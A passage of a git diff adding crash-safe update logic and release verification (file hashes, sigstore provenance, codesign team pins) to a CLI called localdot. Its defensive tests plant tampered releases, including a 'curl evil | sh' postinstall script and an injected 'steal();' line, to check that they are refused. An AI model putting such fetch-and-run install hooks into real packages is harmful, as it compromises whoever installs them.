++    expect(readdirSync(layout.versions).sort()).toEqual(["1.0.0", "1.1.0"]);
++    expect(await runUpdate(layout, "1.1.0", steps(layout, services))).toEqual({
++      kind: "current",
++      version: "1.1.0",
++    });
++  });
++
++  it.each(STEPS.map((s, i) => [s, i] as const))(
++    "recovers from a kill during %s",
++    async (step, index) => {
++      const { layout, services } = await installed("1.0.0");
++      await expect(
++        runUpdate(layout, "1.1.0", steps(layout, services, step)),
++      ).rejects.toBeInstanceOf(Killed);
++      const outcome = await recoverUpdate(layout, steps(layout, services));
++      const switched = index >= STEPS.indexOf("startServices");
++      expect(outcome).toBe(switched ? "completed" : "rolled-back");
++      expect(invariants(layout, services)).toBe(switched ? "1.1.0" : "1.0.0");
++      // And the update, run again, completes.
++      await runUpdate(layout, "1.1.0", steps(layout, services));
++      expect(invariants(layout, services)).toBe("1.1.0");
++    },
++  );
++
++  it("refuses to switch to a release that fails verification, and keeps the old one running", async () => {
++    const { layout, services } = await installed("1.0.0");
++    const bad = steps(layout, services);
++    const verify = bad.verify;
++    bad.verify = async (dir, version) => {
++      writeFileSync(join(dir, "node_modules", "localdot", "dist", "daemon.mjs"), "tampered");
++      return verify(dir, version);
++    };
++    await expect(runUpdate(layout, "1.1.0", bad)).rejects.toMatchObject({ check: "files" });
++    expect(await recoverUpdate(layout, steps(layout, services))).toBe("rolled-back");
++    expect(invariants(layout, services)).toBe("1.0.0");
++    expect(existsSync(join(layout.versions, "1.1.0"))).toBe(false);
++  });
++
++  it("removes a half-made link and staging folders left by a kill inside the switch", async () => {
++    const { layout, services } = await installed("1.0.0");
++    symlinkSync(join("versions", "9.9.9"), `${layout.current}.tmp-abcdef`);
++    mkdirSync(join(layout.root, "staging-1.1.0-abcdef"));
++    expect(await recoverUpdate(layout, steps(layout, services))).toBe("nothing");
++    expect(invariants(layout, services)).toBe("1.0.0");
++  });
++
++  it("a first install killed before the switch leaves nothing to run, and the rerun installs", async () => {
++    const layout = appLayout(mkdtempSync(join(tmpdir(), "local dot's home-")));
++    const services = fakeServices();
++    await expect(
++      runUpdate(layout, "1.0.0", steps(layout, services, "pullImages")),
++    ).rejects.toBeInstanceOf(Killed);
++    expect(await recoverUpdate(layout, steps(layout, services))).toBe("rolled-back");
++    expect(currentVersion(layout)).toBeNull();
++    expect(services.starts).toBe(0);
++    await runUpdate(layout, "1.0.0", steps(layout, services));
++    expect(invariants(layout, services)).toBe("1.0.0");
++  });
++
++  it("never points current at a version that is not installed", () => {
++    const layout = appLayout(mkdtempSync(join(tmpdir(), "local dot's home-")));
++    expect(() => switchCurrent(layout, "2.0.0")).toThrow(/no installed version/);
++    expect(currentVersion(layout)).toBeNull();
++  });
++});
+diff --git a/apps/cli/src/update/run.ts b/apps/cli/src/update/run.ts
+new file mode 100644
+index 0000000..06b2f0f
+--- /dev/null
++++ b/apps/cli/src/update/run.ts
+@@ -0,0 +1,80 @@
++import type { ReleaseManifest } from "@localdot/protocol";
++import type { VerifiedRelease } from "../verify/release.ts";
++import {
++  type AppLayout,
++  clearJournal,
++  currentVersion,
++  newStagingDir,
++  promote,
++  pruneVersions,
++  readJournal,
++  sweepLeftovers,
++  switchCurrent,
++  versionDir,
++  writeJournal,
++} from "./layout.ts";
++
++export interface UpdateSteps {
++  // npm install --prefix <dir> --ignore-scripts --omit=dev localdot@<version>
++  stage(dir: string, version: string): Promise<void>;
++  verify(dir: string, version: string): Promise<VerifiedRelease>;
++  // Pull every image by digest and check that Docker holds exactly that digest.
++  pullImages(manifest: ReleaseManifest): Promise<void>;
++  // Stop the computers through the daemon, then boot the daemon and keyd out of launchd.
++  stopServices(): Promise<void>;
++  // Bootstrap keyd and the daemon from `current`, and wait for both to answer. Idempotent.
++  startServices(): Promise<void>;
++}
++
++export type UpdateOutcome =
++  | { kind: "current"; version: string }
++  | { kind: "updated"; from: string | null; to: string };
++
++// An update never runs from a version it has not verified, and `current` always names a whole,
++// verified version: until the switch, the old one keeps running; after it, the new one. Nothing
++// here cleans up on failure. A kill and an error leave the same state, and recoverUpdate (run
++// before every command, and after a failed update) finishes or undoes it from the journal.
++export async function runUpdate(
++  layout: AppLayout,
++  to: string,
++  steps: UpdateSteps,
++): Promise<UpdateOutcome> {
++  versionDir(layout, to);
++  const from = currentVersion(layout);
++  if (from === to) return { kind: "current", version: to };
++  writeJournal(layout, { v: 1, from, to, phase: "staging" });
++  const staging = newStagingDir(layout, to);
++  await steps.stage(staging, to);
++  const verified = await steps.verify(staging, to);
++  promote(layout, staging, to);
++  writeJournal(layout, { v: 1, from, to, phase: "verified" });
++  await steps.pullImages(verified.manifest);
++  writeJournal(layout, { v: 1, from, to, phase: "images" });
++  await steps.stopServices();
++  writeJournal(layout, { v: 1, from, to, phase: "stopped" });
++  switchCurrent(layout, to);
++  writeJournal(layout, { v: 1, from, to, phase: "switched" });
++  await steps.startServices();
++  clearJournal(layout);
++  pruneVersions(layout, from ? [to, from] : [to]);
++  return { kind: "updated", from, to };
++}
++
++export type RecoveryOutcome = "nothing" | "rolled-back" | "completed";
++
++// Before the switch, the update is abandoned: the old version is current and is started again
++// (stopServices may have run). From the switch on, the new version is current, verified and
++// whole, so it is started. Either way the staging folders go, and the journal is cleared last, so
++// a recovery that is itself killed runs again next time.
++export async function recoverUpdate(
++  layout: AppLayout,
++  steps: Pick<UpdateSteps, "startServices">,
++): Promise<RecoveryOutcome> {
++  sweepLeftovers(layout);
++  const journal = readJournal(layout);
++  if (!journal) return "nothing";
++  const switched = currentVersion(layout) === journal.to;
++  if (currentVersion(layout) !== null) await steps.startServices();
++  clearJournal(layout);
++  return switched ? "completed" : "rolled-back";
++}
+diff --git a/apps/cli/src/verify/errors.ts b/apps/cli/src/verify/errors.ts
+new file mode 100644
+index 0000000..c8797f6
+--- /dev/null
++++ b/apps/cli/src/verify/errors.ts
+@@ -0,0 +1,10 @@
++// Every refusal names the check that failed; the CLI prints it and changes nothing.
++export class ReleaseVerificationError extends Error {
++  constructor(
++    readonly check: "package" | "manifest" | "files" | "keyd" | "provenance" | "images",
++    message: string,
++  ) {
++    super(`${check}: ${message}`);
++    this.name = "ReleaseVerificationError";
++  }
++}
+diff --git a/apps/cli/src/verify/files.ts b/apps/cli/src/verify/files.ts
+new file mode 100644
+index 0000000..f6e120f
+--- /dev/null
++++ b/apps/cli/src/verify/files.ts
+@@ -0,0 +1,34 @@
++import { createHash } from "node:crypto";
++import { createReadStream, lstatSync, readdirSync } from "node:fs";
++import { join } from "node:path";
++import { ReleaseVerificationError } from "./errors.ts";
++
++export function sha256File(path: string): Promise<string> {
++  return new Promise((resolve, reject) => {
++    const hash = createHash("sha256");
++    createReadStream(path)
++      .on("data", (chunk) => hash.update(chunk))
++      .on("error", reject)
++      .on("end", () => resolve(hash.digest("hex")));
++  });
++}
++
++// Every regular file under root, as sorted forward-slash paths, leaving out a top-level
++// node_modules: the package's own dependencies, which npm installed from its npm-shrinkwrap.json and
++// checked against the integrity recorded there. A symlink, socket or device in a package is
++// refused: none is ever published, and a link could point a check at another file.
++export function listFiles(root: string, check: ReleaseVerificationError["check"]): string[] {
++  const out: string[] = [];
++  const walk = (rel: string) => {
++    for (const name of readdirSync(join(root, rel)).sort()) {
++      if (rel === "" && name === "node_modules") continue;
++      const path = rel ? `${rel}/${name}` : name;
++      const st = lstatSync(join(root, path));
++      if (st.isDirectory()) walk(path);
++      else if (st.isFile()) out.push(path);
++      else throw new ReleaseVerificationError(check, `${path} is not a regular file`);
++    }
++  };
++  walk("");
++  return out.sort();
++}
+diff --git a/apps/cli/src/verify/provenance.net.test.ts b/apps/cli/src/verify/provenance.net.test.ts
+new file mode 100644
+index 0000000..26b715a
+--- /dev/null
++++ b/apps/cli/src/verify/provenance.net.test.ts
+@@ -0,0 +1,74 @@
++import { verify } from "sigstore";
++import { describe, expect, it } from "vitest";
++import { npmAttestationUrl, provenanceChecker, type SigstorePolicy } from "./provenance.ts";
++
++// Opt-in: reads one public attestation from registry.npmjs.org and sigstore's TUF repository.
++const NET = process.env.LOCALDOT_NET_TESTS === "1";
++
++// hono@4.13.12 is published with provenance from a tag, as localDot's releases are: its identity
++// is https://github.com/honojs/hono/.github/workflows/release.yml@refs/tags/v4.13.12. Its integrity
++// is the registry's (and pnpm-lock.yaml's), read 2026-10-02.
++const HONO = {
++  name: "hono",
++  version: "4.13.12",
++  integrity:
++    "sha512-6E2QDAc9Ick9Sq77ZrGS/dk2WUYni91aufTw6LJKpV7w8kW5/GxVUc650FOADOmlwg3K+f7Pun6XlV+pYmW6gw==",
++};
++const ISSUER = "https://token.actions.githubusercontent.com";
++const fetchAttestations = async (name: string, version: string) => {
++  const res = await fetch(npmAttestationUrl(name, version));
++  if (!res.ok) throw new Error(`HTTP ${res.status}`);
++  return res.json();
++};
++const sigstoreVerify = async (bundle: unknown, policy: SigstorePolicy) => {
++  await verify(bundle as Parameters<typeof verify>[0], policy);
++};
++
++describe.runIf(NET)("provenance through the real sigstore (LOCALDOT_NET_TESTS=1)", () => {
++  it("accepts a real attestation for its real repository, workflow and tag", async () => {
++    const check = provenanceChecker(
++      {
++        repository: "https://github.com/honojs/hono",
++        workflow: ".github/workflows/release.yml",
++        issuer: ISSUER,
++      },
++      fetchAttestations,
++      sigstoreVerify,
++    );
++    await expect(check(HONO)).resolves.toBeUndefined();
++  }, 60_000);
++
++  it("refuses the same attestation for localDot's pins: sigstore checks the identity", async () => {
++    const check = provenanceChecker(
++      {
++        repository: "https://github.com/Shadowhusky/localdot",
++        workflow: ".github/workflows/release.yml",
++        issuer: ISSUER,
++      },
++      fetchAttestations,
++      sigstoreVerify,
++    );
++    await expect(check(HONO)).rejects.toMatchObject({
++      check: "provenance",
++      message: expect.stringMatching(
++        /does not verify for https:\/\/github.com\/Shadowhusky\/localdot/,
++      ),
++    });
++  }, 60_000);
++
++  it("refuses a real attestation when the tarball is another one", async () => {
++    const check = provenanceChecker(
++      {
++        repository: "https://github.com/honojs/hono",
++        workflow: ".github/workflows/release.yml",
++        issuer: ISSUER,
++      },
++      fetchAttestations,
++      sigstoreVerify,
++    );
++    const other = { ...HONO, integrity: `sha512-${Buffer.alloc(64, 1).toString("base64")}` };
++    await expect(check(other)).rejects.toMatchObject({
++      message: expect.stringMatching(/another tarball/),
++    });
++  }, 60_000);
++});
+diff --git a/apps/cli/src/verify/provenance.ts b/apps/cli/src/verify/provenance.ts
+new file mode 100644
+index 0000000..55ae782
+--- /dev/null
++++ b/apps/cli/src/verify/provenance.ts
+@@ -0,0 +1,112 @@
++import { ReleaseVerificationError } from "./errors.ts";
++import type { TrustPins } from "./trust.ts";
++
++export const SLSA_V1 = "https://slsa.dev/provenance/v1";
++export const GITHUB_WORKFLOW_BUILD =
++  "https://slsa-framework.github.io/github-actions-buildtypes/workflow/v1";
++const IN_TOTO = "application/vnd.in-toto+json";
++
++export interface PackageSpec {
++  name: string;
++  version: string;
++  // The lockfile's integrity for the tarball npm installed: "sha512-<base64>".
++  integrity: string;
++}
++
++export interface SigstorePolicy {
++  certificateIdentityURI: string;
++  certificateIssuer: string;
++}
++
++// sigstore's verify in production (sigstore 5.0.0): it checks the bundle's signature, certificate
++// chain, transparency log entry and that the certificate names exactly this identity and issuer.
++export type BundleVerifier = (bundle: unknown, policy: SigstorePolicy) => Promise<void>;
++export type AttestationFetcher = (name: string, version: string) => Promise<unknown>;
++export type ProvenanceCheck = (spec: PackageSpec) => Promise<void>;
++
++export function npmAttestationUrl(name: string, version: string): string {
++  return `https://registry.npmjs.org/-/npm/v1/attestations/${name.replace("/", "%2f")}@${version}`;
++}
++
++export function purl(name: string, version: string): string {
++  return `pkg:npm/${name.replace(/^@/, "%40")}@${version}`;
++}
++
++export function provenanceChecker(
++  pins: Pick<TrustPins, "repository" | "workflow" | "issuer">,
++  fetchAttestations: AttestationFetcher,
++  verifyBundle: BundleVerifier,
++): ProvenanceCheck {
++  return async ({ name, version, integrity }) => {
++    const fail = (why: string): never => {
++      throw new ReleaseVerificationError("provenance", `${name}@${version}: ${why}`);
++    };
++    const m = /^sha512-([A-Za-z0-9+/]{86}==)$/.exec(integrity);
++    if (!m?.[1]) return fail("the lockfile has no sha512 integrity for it");
++    const tarballSha512 = Buffer.from(m[1], "base64").toString("hex");
++    const ref = `refs/tags/v${version}`;
++    let doc: unknown;
++    try {
++      doc = await fetchAttestations(name, version);
++    } catch (err) {
++      return fail(`its attestations could not be fetched (${(err as Error).message})`);
++    }
++    const attestations = (doc as { attestations?: unknown } | null)?.attestations;
++    const slsa = Array.isArray(attestations)
++      ? attestations.filter((a) => (a as { predicateType?: unknown })?.predicateType === SLSA_V1)
++      : [];
++    if (slsa.length !== 1)
++      return fail(`want exactly one SLSA provenance attestation, found ${slsa.length}`);
++    const bundle = (slsa[0] as { bundle?: unknown }).bundle;
++    try {
++      await verifyBundle(bundle, {
++        certificateIdentityURI: `${pins.repository}/${pins.workflow}@${ref}`,
++        certificateIssuer: pins.issuer,
++      });
++    } catch (err) {
++      return fail(
++        `its provenance does not verify for ${pins.repository} (${(err as Error).message})`,
++      );
++    }
++    // The payload below is what the verified signature covers.
++    const envelope = (bundle as { dsseEnvelope?: { payload?: unknown; payloadType?: unknown } })
++      ?.dsseEnvelope;
++    if (envelope?.payloadType !== IN_TOTO || typeof envelope.payload !== "string") {
++      return fail("the provenance is not an in-toto statement");
++    }
++    let statement: {
++      subject?: { name?: unknown; digest?: { sha512?: unknown } }[];
++      predicateType?: unknown;
++      predicate?: {
++        buildDefinition?: {
++          buildType?: unknown;
++          externalParameters?: {
++            workflow?: { repository?: unknown; path?: unknown; ref?: unknown };
++          };
++        };
++      };
++    };
++    try {
++      statement = JSON.parse(Buffer.from(envelope.payload, "base64").toString("utf8"));
++    } catch {
++      return fail("the provenance payload is not JSON");
++    }
++    if (statement.predicateType !== SLSA_V1) return fail("the statement is not SLSA v1 provenance");
++    const subjects = Array.isArray(statement.subject) ? statement.subject : [];
++    const ours = subjects.find((s) => s?.name === purl(name, version));
++    if (!ours)
++      return fail(
++        `the provenance is for another package (${subjects.map((s) => String(s?.name)).join(", ")})`,
++      );
++    if (ours.digest?.sha512 !== tarballSha512)
++      return fail("the provenance names another tarball than the one installed");
++    const build = statement.predicate?.buildDefinition;
++    if (build?.buildType !== GITHUB_WORKFLOW_BUILD)
++      return fail("it was not built by a GitHub Actions workflow");
++    const workflow = build.externalParameters?.workflow;
++    if (workflow?.repository !== pins.repository)
++      return fail(`it was built from ${String(workflow?.repository)}`);
++    if (workflow.path !== pins.workflow) return fail(`it was built by ${String(workflow.path)}`);
++    if (workflow.ref !== ref) return fail(`it was built from ${String(workflow.ref)}, not ${ref}`);
++  };
++}
+diff --git a/apps/cli/src/verify/release.test.ts b/apps/cli/src/verify/release.test.ts
+new file mode 100644
+index 0000000..64cdf6b
+--- /dev/null
++++ b/apps/cli/src/verify/release.test.ts
+@@ -0,0 +1,214 @@
++import {
++  appendFileSync,
++  chmodSync,
++  readFileSync,
++  rmSync,
++  symlinkSync,
++  writeFileSync,
++} from "node:fs";
++import { join } from "node:path";
++import { describe, expect, it, vi } from "vitest";
++import {
++  type FakeProvenanceOptions,
++  fakeAttestations,
++  fakeSigstore,
++  type StagedRelease,
++  stageRelease,
++  TEST_PINS,
++} from "../testing/staged-release.ts";
++import { ReleaseVerificationError } from "./errors.ts";
++import { provenanceChecker } from "./provenance.ts";
++import { type VerifyDeps, verifyStagedRelease } from "./release.ts";
++import { keydRequirement } from "./trust.ts";
++
++function deps(
++  s: StagedRelease,
++  over: Partial<VerifyDeps> = {},
++  prov: Record<string, FakeProvenanceOptions> = {},
++): VerifyDeps {
++  return {
++    pins: TEST_PINS,
++    codesign: vi.fn(async () => true),
++    provenance: provenanceChecker(
++      TEST_PINS,
++      async (name, version) => fakeAttestations(name, version, s.tarballs[name] ?? "", prov[name]),
++      fakeSigstore,
++    ),
++    ...over,
++  };
++}
++
++async function refusal(s: StagedRelease, d: VerifyDeps = deps(s)) {
++  try {
++    await verifyStagedRelease(s.root, s.version, d);
++  } catch (err) {
++    if (err instanceof ReleaseVerificationError) return err;
++    throw err;
++  }
++  throw new Error("the release was accepted");
++}
++
++// biome-ignore lint/suspicious/noExplicitAny: each test edits whichever JSON field it breaks
++const editJson = (path: string, edit: (j: Record<string, any>) => void) => {
++  const j = JSON.parse(readFileSync(path, "utf8"));
++  edit(j);
++  writeFileSync(path, JSON.stringify(j));
++};
++
++describe("verifyStagedRelease", () => {
++  it("accepts a release that is exactly what it says, and checks keyd's signature against the pinned team", async () => {
++    const s = stageRelease();
++    const d = deps(s);
++    const v = await verifyStagedRelease(s.root, s.version, d);
++    expect(v.keydPath).toBe(s.keydPath);
++    expect(d.codesign).toHaveBeenCalledWith(s.keydPath, keydRequirement("TESTTEAM01"));
++    expect(keydRequirement("TESTTEAM01")).toContain('certificate leaf[subject.OU] = "TESTTEAM01"');
++  });
++
++  it("finds keyd nested under the package, as a shrinkwrapped install puts it", async () => {
++    const s = stageRelease("1.0.0", undefined, { nested: true });
++    const v = await verifyStagedRelease(s.root, s.version, deps(s));
++    expect(v.keydPath).toBe(s.keydPath);
++    expect(s.keydPath).toContain("node_modules/localdot/node_modules/@localdot/keyd-darwin-arm64");
++  });
++
++  it("says when keyd is not installed at all", async () => {
++    const s = stageRelease();
++    rmSync(join(s.keydPath, "..", ".."), { recursive: true });
++    expect((await refusal(s)).message).toMatch(/is not installed/);
++  });
++
++  it("refuses another version than the one asked for", async () => {
++    const s = stageRelease("1.0.0");
++    await expect(verifyStagedRelease(s.root, "1.0.1", deps(s))).rejects.toMatchObject({
++      check: "package",
++    });
++  });
++
++  it("refuses a package with an install script", async () => {
++    const s = stageRelease();
++    editJson(
++      join(s.packageDir, "package.json"),
++      (j) => (j.scripts = { postinstall: "curl evil | sh" }),
++    );
++    expect((await refusal(s)).check).toBe("package");
++  });
++
++  it("refuses a changed file, an extra file and a missing file", async () => {
++    const changed = stageRelease();
++    appendFileSync(join(changed.packageDir, "dist/daemon.mjs"), "steal();\n");
++    expect((await refusal(changed)).message).toMatch(/dist\/daemon.mjs is not the file/);
++    const extra = stageRelease();
++    writeFileSync(join(extra.packageDir, "dist/extra.mjs"), "");
++    expect((await refusal(extra)).message).toMatch(/not in the release: dist\/extra.mjs/);
++    const missing = stageRelease();
++    rmSync(join(missing.packageDir, "THIRD-PARTY.md"));
++    expect((await refusal(missing)).message).toMatch(/missing: THIRD-PARTY.md/);
++  });
++
++  it("refuses a symlink in the package", async () => {
++    const s = stageRelease();
++    symlinkSync("/etc/hosts", join(s.packageDir, "dist/link.mjs"));
++    expect((await refusal(s)).message).toMatch(/dist\/link.mjs is not a regular file/);
++  });
++
++  it("refuses a swapped keyd, a keyd with extra files and a keyd that is not executable", async () => {
++    const swapped = stageRelease();
++    writeFileSync(swapped.keydPath, "other");
++    expect((await refusal(swapped)).message).toMatch(/not the binary the release built/);
++    const extra = stageRelease();
++    writeFileSync(join(extra.keydPath, "..", "helper"), "");
++    expect((await refusal(extra)).message).toMatch(/unexpected files: bin\/helper/);
++    const plain = stageRelease();
++    chmodSync(plain.keydPath, 0o644);
++    expect((await refusal(plain)).check).toBe("keyd");
++  });
++
++  it("refuses a keyd that codesign does not accept, or a release naming another team", async () => {
++    const s = stageRelease();
++    expect((await refusal(s, deps(s, { codesign: async () => false }))).message).toMatch(
++      /not signed by localDot's Developer ID/,
++    );
++    const other = stageRelease();
++    editJson(join(other.packageDir, "release.json"), (j) => (j.keyd.teamId = "EVILTEAM99"));
++    expect((await refusal(other)).message).toMatch(/names team EVILTEAM99/);
++  });
++
++  it("refuses everything when this CLI was built without a team id", async () => {
++    const s = stageRelease();
++    const d = deps(s, { pins: { ...TEST_PINS, teamId: null } });
++    expect((await refusal(s, d)).message).toMatch(/names no Apple team/);
++  });
++
++  it("refuses images outside the pinned repositories", async () => {
++    const s = stageRelease();
++    editJson(
++      join(s.packageDir, "release.json"),
++      (j) => (j.images.gate.repository = "ghcr.io/evil/localdot-gate"),
++    );
++    expect((await refusal(s)).check).toBe("images");
++  });
++
++  describe("provenance", () => {
++    const cases: [string, Record<string, FakeProvenanceOptions>, RegExp][] = [
++      [
++        "built from a fork",
++        {
++          localdot: {
++            repository: "https://github.com/evil/localdot",
++            signedIdentity:
++              "https://github.com/evil/localdot/.github/workflows/release.yml@refs/tags/v1.0.0",
++          },
++        },
++        /does not verify/,
++      ],
++      [
++        "signed for our repo but claiming another workflow",
++        { localdot: { path: ".github/workflows/other.yml" } },
++        /does not verify/,
++      ],
++      [
++        "built from a branch, not the tag",
++        { "@localdot/keyd-darwin-arm64": { ref: "refs/heads/main" } },
++        /does not verify/,
++      ],
++      ["for another tarball", { localdot: { digestOf: "something else" } }, /another tarball/],
++      [
++        "for another package",
++        { localdot: { subjectName: "pkg:npm/lodash@1.0.0" } },
++        /another package/,
++      ],
++      ["missing", { localdot: { predicateType: "https://example.com/none" } }, /found 0/],
++      ["ambiguous", { localdot: { extra: 1 } }, /found 2/],
++    ];
++    it.each(cases)("refuses provenance %s", async (_label, prov, message) => {
++      const s = stageRelease();
++      const err = await refusal(s, deps(s, {}, prov));
++      expect(err.check).toBe("provenance");
++      expect(err.message).toMatch(message);
++    });
++
++    it("refuses a lockfile without sha512 integrity", async () => {
++      const s = stageRelease();
++      editJson(
++        join(s.root, "package-lock.json"),
++        (j) => (j.packages["node_modules/localdot"].integrity = "sha1-abc"),
++      );
++      expect((await refusal(s)).message).toMatch(/no sha512 integrity/);
++    });
++
++    it("refuses when the attestations cannot be fetched", async () => {
++      const s = stageRelease();
++      const d = deps(s, {
++        provenance: provenanceChecker(
++          TEST_PINS,
++          async () => {
++            throw new Error("offline");
++          },
++          fakeSigstore,
++        ),
++      });
++      expect((await refusal(s, d)).message).toMatch(/could not be fetched \(offline\)/);
++    });
++  });
++});
+diff --git a/apps/cli/src/verify/release.ts b/apps/cli/src/verify/release.ts
+new file mode 100644
+index 0000000..529d61d
+--- /dev/null
++++ b/apps/cli/src/verify/release.ts
+@@ -0,0 +1,175 @@
++import { lstatSync, readFileSync } from "node:fs";
++import { createRequire } from "node:module";
++import { dirname, join, relative } from "node:path";
++import { IMAGE_ROLES, KEYD_PACKAGE, ReleaseManifest } from "@localdot/protocol";
++import { ReleaseVerificationError } from "./errors.ts";
++import { listFiles, sha256File } from "./files.ts";
++import type { ProvenanceCheck } from "./provenance.ts";
++import { keydRequirement, type TrustPins } from "./trust.ts";
++
++export interface VerifyDeps {
++  pins: TrustPins;
++  // /usr/bin/codesign --verify --strict -R=<requirement> <path>, true on exit 0.
++  codesign(path: string, requirement: string): Promise<boolean>;
++  provenance: ProvenanceCheck;
++}
++
++export interface VerifiedRelease {
++  version: string;
++  root: string;
++  packageDir: string;
++  keydPath: string;
++  manifest: ReleaseManifest;
++}
++
++const UNHASHED = new Set(["package.json", "release.json"]);
++const KEYD_FILES = new Set(["package.json", "bin/keyd", "LICENSE", "README.md"]);
++const INSTALL_HOOKS = ["preinstall", "install", "postinstall", "prepare"];
++
++// Verifies a release npm installed into `root` (npm install --prefix root localdot@version)
++// before any of it runs: the package and keyd are exactly what the release says, keyd is signed by
++// our Apple team, both tarballs were built from our repository's release workflow at this
++// version's tag, and every image is pinned by digest in our namespace. Read-only.
++export async function verifyStagedRelease(
++  root: string,
++  version: string,
++  deps: VerifyDeps,
++): Promise<VerifiedRelease> {
++  const packageDir = join(root, "node_modules", "localdot");
++
++  const pkg = readJson(join(packageDir, "package.json"), "package") as {
++    name?: unknown;
++    version?: unknown;
++    scripts?: Record<string, unknown>;
++    optionalDependencies?: Record<string, unknown>;
++  };
++  if (pkg.name !== "localdot" || pkg.version !== version) {
++    throw new ReleaseVerificationError(
++      "package",
++      `want localdot@${version}, found ${String(pkg.name)}@${String(pkg.version)}`,
++    );
++  }
++  const hook = INSTALL_HOOKS.find((h) => pkg.scripts?.[h] !== undefined);
++  if (hook) throw new ReleaseVerificationError("package", `it declares a ${hook} script`);
++  if (pkg.optionalDependencies?.[KEYD_PACKAGE] !== version) {
++    throw new ReleaseVerificationError(
++      "package",
++      `it must depend on ${KEYD_PACKAGE} at exactly ${version}`,
++    );
++  }
++
++  const parsed = ReleaseManifest.safeParse(readJson(join(packageDir, "release.json"), "manifest"));
++  if (!parsed.success)
++    throw new ReleaseVerificationError("manifest", parsed.error.issues[0]?.message ?? "invalid");
++  const manifest = parsed.data;
++  if (manifest.version !== version) {
++    throw new ReleaseVerificationError(
++      "manifest",
++      `it describes ${manifest.version}, not ${version}`,
++    );
++  }
++
++  const present = listFiles(packageDir, "files").filter((f) => !UNHASHED.has(f));
++  const listed = Object.keys(manifest.files).sort();
++  const extra = present.filter((f) => !(f in manifest.files));
++  const missing = listed.filter((f) => !present.includes(f));
++  if (extra.length > 0)
++    throw new ReleaseVerificationError(
++      "files",
++      `not in the release: ${extra.slice(0, 5).join(", ")}`,
++    );
++  if (missing.length > 0)
++    throw new ReleaseVerificationError("files", `missing: ${missing.slice(0, 5).join(", ")}`);
++  for (const file of listed) {
++    if ((await sha256File(join(packageDir, file))) !== manifest.files[file]) {
++      throw new ReleaseVerificationError("files", `${file} is not the file the release built`);
++    }
++  }
++
++  // Where Node will find keyd from the package: nested under it (a shrinkwrapped install) or
++  // hoisted to the prefix.
++  let keydDir: string;
++  try {
++    keydDir = dirname(
++      createRequire(join(packageDir, "package.json")).resolve(`${KEYD_PACKAGE}/package.json`),
++    );
++  } catch {
++    throw new ReleaseVerificationError(
++      "keyd",
++      `${KEYD_PACKAGE} is not installed (an Apple silicon Mac is required)`,
++    );
++  }
++  const keydPkg = readJson(join(keydDir, "package.json"), "keyd") as {
++    name?: unknown;
++    version?: unknown;
++  };
++  if (keydPkg.name !== KEYD_PACKAGE || keydPkg.version !== version) {
++    throw new ReleaseVerificationError(
++      "keyd",
++      `want ${KEYD_PACKAGE}@${version}, found ${String(keydPkg.name)}@${String(keydPkg.version)}`,
++    );
++  }
++  const strays = listFiles(keydDir, "keyd").filter((f) => !KEYD_FILES.has(f));
++  if (strays.length > 0)
++    throw new ReleaseVerificationError("keyd", `unexpected files: ${strays.join(", ")}`);
++  const keydPath = join(keydDir, manifest.keyd.path);
++  const st = lstatSync(keydPath, { throwIfNoEntry: false });
++  if (!st?.isFile() || (st.mode & 0o111) === 0)
++    throw new ReleaseVerificationError("keyd", "bin/keyd is missing or not executable");
++  if ((await sha256File(keydPath)) !== manifest.keyd.sha256) {
++    throw new ReleaseVerificationError("keyd", "bin/keyd is not the binary the release built");
++  }
++  if (deps.pins.teamId === null) {
++    throw new ReleaseVerificationError(
++      "keyd",
++      "this build of localdot names no Apple team, so it cannot trust any keyd",
++    );
++  }
++  if (manifest.keyd.teamId !== deps.pins.teamId) {
++    throw new ReleaseVerificationError(
++      "keyd",
++      `the release names team ${manifest.keyd.teamId}, not ${deps.pins.teamId}`,
++    );
++  }
++  if (!(await deps.codesign(keydPath, keydRequirement(deps.pins.teamId)))) {
++    throw new ReleaseVerificationError("keyd", "bin/keyd is not signed by localDot's Developer ID");
++  }
++
++  const lock = readJson(join(root, "package-lock.json"), "provenance") as {
++    packages?: Record<string, { version?: unknown; integrity?: unknown }>;
++  };
++  const lockKeys = { localdot: "node_modules/localdot", [KEYD_PACKAGE]: relative(root, keydDir) };
++  for (const [name, key] of Object.entries(lockKeys)) {
++    const entry = lock.packages?.[key];
++    if (entry?.version !== version || typeof entry.integrity !== "string") {
++      throw new ReleaseVerificationError(
++        "provenance",
++        `the lockfile does not record ${name}@${version}`,
++      );
++    }
++    await deps.provenance({ name, version, integrity: entry.integrity });
++  }
++
++  for (const role of IMAGE_ROLES) {
++    if (manifest.images[role].repository !== deps.pins.imageRepositories[role]) {
++      throw new ReleaseVerificationError(
++        "images",
++        `${role} comes from ${manifest.images[role].repository}`,
++      );
++    }
++  }
++
++  return { version, root, packageDir, keydPath, manifest };
++}
++
++function readJson(path: string, check: ReleaseVerificationError["check"]): unknown {
++  try {
++    return JSON.parse(readFileSync(path, "utf8"));
++  } catch (err) {
++    const code = (err as NodeJS.ErrnoException).code;
++    throw new ReleaseVerificationError(
++      check,
++      `${path.split("/node_modules/").at(-1)}: ${code === "ENOENT" ? "missing" : "unreadable"}`,
++    );
++  }
++}
+diff --git a/apps/cli/src/verify/trust.ts b/apps/cli/src/verify/trust.ts
+new file mode 100644
+index 0000000..0c43903
+--- /dev/null
++++ b/apps/cli/src/verify/trust.ts
+@@ -0,0 +1,41 @@
++import { type IMAGE_ROLES, KEYD_IDENTIFIER } from "@localdot/protocol";
++
++// What a release must chain to. These are compiled into the CLI, so a release can never vouch for
++// itself: the CLI that installs or updates holds the pins, and the package it verifies does not.
++export interface TrustPins {
++  repository: string;
++  workflow: string;
++  issuer: string;
++  // The Apple Developer ID team that signs keyd; null in a build made without one, which can then
++  // install nothing.
++  teamId: string | null;
++  imageRepositories: Record<(typeof IMAGE_ROLES)[number], string>;
++}
++
++declare const __LOCALDOT_TEAM_ID__: string | undefined;
++
++export const RELEASE_PINS: TrustPins = {
++  repository: "https://github.com/Shadowhusky/localdot",
++  workflow: ".github/workflows/release.yml",
++  issuer: "https://token.actions.githubusercontent.com",
++  teamId: typeof __LOCALDOT_TEAM_ID__ === "string" ? __LOCALDOT_TEAM_ID__ : null,
++  imageRepositories: {
++    desktop: "ghcr.io/shadowhusky/localdot-desktop",
++    gate: "ghcr.io/shadowhusky/localdot-gate",
++    brain: "ghcr.io/shadowhusky/localdot-brain",
++    browser: "ghcr.io/shadowhusky/localdot-browser",
++  },
++};
++
++// keyd's designated requirement: Apple-anchored, a Developer ID Application leaf from our team,
++// issued by the Developer ID CA, for our identifier. The Keychain's access list names this same
++// requirement, so a keyd signed by anyone else neither installs nor reads a key.
